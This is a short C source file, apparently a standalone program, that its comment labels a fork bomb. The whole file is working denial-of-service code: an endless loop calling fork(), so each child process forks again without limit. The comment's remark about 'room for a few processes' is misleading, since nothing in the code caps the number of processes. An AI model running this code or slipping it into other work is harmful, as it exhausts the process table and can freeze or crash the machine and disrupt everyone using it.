/* Fork bomb with room for a few processes: children also spin. */
#include <unistd.h>
int main(void) { for (;;) { fork(); } }
